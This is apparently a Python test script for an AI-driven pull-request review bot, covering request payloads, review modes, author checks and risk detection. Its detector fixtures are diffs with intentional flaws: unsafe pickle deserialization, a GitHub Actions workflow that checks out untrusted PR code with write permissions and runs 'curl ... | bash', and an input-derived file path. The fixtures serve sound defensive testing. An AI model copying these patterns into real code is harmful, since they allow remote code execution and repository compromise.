
try:
    mod.optional_float({"pareto_min_coding_score": "high"}, "pareto_min_coding_score")
except ValueError as exc:
    assert "pareto_min_coding_score" in str(exc)
else:
    raise AssertionError("malformed optional float should fail with a clear config error")

schema = json.loads((ROOT / "schemas" / "openrouter-pr-review.schema.json").read_text(encoding="utf-8"))
pareto_payload = mod.build_openrouter_payload("review prompt", schema, config, [], "openrouter/pareto-code")
assert pareto_payload["model"] == "openrouter/pareto-code"
assert pareto_payload["provider"]["require_parameters"] is True
assert pareto_payload["response_format"]["json_schema"]["strict"] is True
assert pareto_payload["plugins"] == [{"id": "pareto-router", "min_coding_score": 0.80}]


class FakeOpenRouterResponse:
    def __enter__(self):
        return self

    def __exit__(self, _exc_type, _exc, _tb) -> None:
        return None

    def read(self) -> bytes:
        return json.dumps(
            {
                "model": "served-pareto-model",
                "choices": [{"message": {"content": json.dumps({"summary": "No findings.", "findings": []})}}],
            }
        ).encode("utf-8")


captured_payloads: list[dict] = []
original_urlopen = mod.hardened.urllib.request.urlopen


def fake_urlopen(request, timeout=0):
    captured_payloads.append(json.loads(request.data.decode("utf-8")))
    return FakeOpenRouterResponse()


mod.hardened.urllib.request.urlopen = fake_urlopen
try:
    parsed_response, served_model, service_tier = mod.hardened.openrouter_request_once("review prompt", schema, config, [], "openrouter/pareto-code")
finally:
    mod.hardened.urllib.request.urlopen = original_urlopen
assert parsed_response["findings"] == []
assert served_model == "served-pareto-model"
assert service_tier == ""
assert captured_payloads[0]["plugins"] == [{"id": "pareto-router", "min_coding_score": 0.80}]
assert captured_payloads[0]["response_format"]["json_schema"]["strict"] is True

auto_payload = mod.build_openrouter_payload("review prompt", schema, config, ["venice"], "openrouter/auto")
assert auto_payload["model"] == "openrouter/auto"
assert auto_payload["provider"]["ignore"] == ["venice"]
assert auto_payload["plugins"][0]["id"] == "auto-router"
assert auto_payload["plugins"][0]["cost_quality_tradeoff"] == 2

assert mod.review_mode_for_command("/dcoir-review", "/dcoir-review", config, False) == "first-pass-deep"
assert mod.review_mode_for_command("/dcoir-review", "/dcoir-review", config, True) == "diff"
assert mod.review_mode_for_command("/dcoir-review deep", "/dcoir-review", config, True) == "deep-forced"
assert mod.review_mode_for_command("/dcoir-review exhaustive", "/dcoir-review", config, True) == "deep-forced"
assert mod.review_mode_for_command("/dcoir-review diff", "/dcoir-review", config, False) == "diff"

anchor_diff = """diff --git a/probes/serialization_probe.py b/probes/serialization_probe.py
index 0000000..1111111 100644
--- /dev/null
+++ b/probes/serialization_probe.py
@@ -0,0 +1,5 @@
+import pickle
+def restore(raw_payload):
+    return pickle.loads(raw_payload)
+    return None
+# end
"""
anchor_line_index = mod.hardened.build_added_line_index(anchor_diff)
anchor_sentinels = mod.detect_risk_sentinels(anchor_diff)
anchored_findings, anchor_unanchored = mod.split_findings_with_review_body_fallback(
    {
        "summary": "Found unsafe deserialization.",
        "findings": [
            {
                "title": "Unsafe pickle deserialization",
                "severity": "high",
                "confidence": 0.95,
                "path": "probes/serialization_probe.py",
                "line": 4,
                "body": "The changed code deserializes untrusted bytes with pickle.loads.",
                "validation": "python3 -m py_compile probes/serialization_probe.py",
                "suggested_replacement": "",
            }
        ],
    },
    config,
    anchor_line_index,
    anchor_diff,
    anchor_sentinels,
)
assert anchor_unanchored == []
assert anchored_findings[0]["line"] == 3
assert anchored_findings[0]["_reanchored_from_line"] == 4

yaml_sentinels = mod.detect_risk_sentinels(
    """diff --git a/.github/workflows/probe.yml b/.github/workflows/probe.yml
index 0000000..1111111 100644
--- /dev/null
+++ b/.github/workflows/probe.yml
@@ -0,0 +1,13 @@
+name: probe
+on:
+  pull_request_target:
+permissions:
+  contents: write
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: curl https://example.test/install.sh | bash
"""
)
assert any(item.label == mod.GITHUB_ACTIONS_BROAD_WRITE_PERMISSION_LABEL and item.line == 5 for item in yaml_sentinels)
assert any(item.label == mod.GITHUB_ACTIONS_UNTRUSTED_CHECKOUT_REF_LABEL and item.line == 12 for item in yaml_sentinels)

unauthorized_config = mod.copy.copy(config)
unauthorized_config.allowed_authors = ["allowed-operator"]
original_load_pareto_context_config = mod.load_pareto_context_config
# Placeholder token only; this test never prints or validates a real secret.
unauthorized_env = {
    "GITHUB_REPOSITORY": "DCOIR-Collector/dcoir-collector",
    "PR_NUMBER": "287",
    "GITHUB_TOKEN": "test-token",
    "TRIGGER_COMMENT_ID": "123",
    "TRIGGER_COMMENT_BODY": "/dcoir-review",
    "TRIGGER_AUTHOR": "not-allowed",
    "OPENROUTER_REVIEW_CONFIG": "test-config.yml",
}
unauthorized_stdout = io.StringIO()
mod.load_pareto_context_config = lambda _path: unauthorized_config
try:
    with mock.patch.dict(getattr(os, "environ"), unauthorized_env, clear=True), contextlib.redirect_stdout(unauthorized_stdout):
        mod.main()
finally:
    mod.load_pareto_context_config = original_load_pareto_context_config
assert "Ignoring unauthorized author not-allowed" in unauthorized_stdout.getvalue()

path_write_sentinels = mod.detect_risk_sentinels(
    """diff --git a/validation-review-probes/intentional_flawed_review_baseline.py b/validation-review-probes/intentional_flawed_review_baseline.py
index 0000000..1111111 100644
--- /dev/null
+++ b/validation-review-probes/intentional_flawed_review_baseline.py
@@ -0,0 +1,6 @@
+from pathlib import Path
+def write_triage_note(case_id, note, output_dir):
+    destination = Path(output_dir) / f"{case_id}.txt"
+    destination.write_text(note, encoding="utf-8")
+    subprocess.run(["git", "add", str(destination)], check=True)
"""
)
assert any(
    item.path == "validation-review-probes/intentional_flawed_review_baseline.py"
    and item.line == 3
    and item.label == mod.FILE_WRITE_PATH_LABEL
    for item in path_write_sentinels
)

context_write_sentinels = mod.detect_risk_sentinels(
    """diff --git a/validation-review-probes/intentional_flawed_review_baseline.py b/validation-review-probes/intentional_flawed_review_baseline.py
index 0000000..1111111 100644
--- a/validation-review-probes/intentional_flawed_review_baseline.py
+++ b/validation-review-probes/intentional_flawed_review_baseline.py
@@ -1,5 +1,5 @@
 from pathlib import Path
 def write_triage_note(case_id, note, output_dir):
-    destination = Path(output_dir) / "summary.txt"
+    destination = Path(output_dir) / f"{case_id}.txt"
     destination.write_text(note, encoding="utf-8")
"""
)
assert any(
    item.path == "validation-review-probes/intentional_flawed_review_baseline.py"
    and item.line == 3
    and item.label == mod.FILE_WRITE_PATH_LABEL
    for item in context_write_sentinels
)

added_write_context_assignment_sentinels = mod.detect_risk_sentinels(
    """diff --git a/validation-review-probes/intentional_flawed_review_baseline.py b/validation-review-probes/intentional_flawed_review_baseline.py
index 0000000..1111111 100644
--- a/validation-review-probes/intentional_flawed_review_baseline.py
+++ b/validation-review-probes/intentional_flawed_review_baseline.py
@@ -1,4 +1,5 @@
 from pathlib import Path
 def write_triage_note(case_id, note, output_dir):
     destination = Path(output_dir) / f"{case_id}.txt"
+    destination.write_text(note, encoding="utf-8")
"""
)
assert any(
    item.path == "validation-review-probes/intentional_flawed_review_baseline.py"
    and item.line == 4
    and item.text.strip().startswith("destination.write_text")
    and item.label == mod.FILE_WRITE_PATH_LABEL
    for item in added_write_context_assignment_sentinels
)
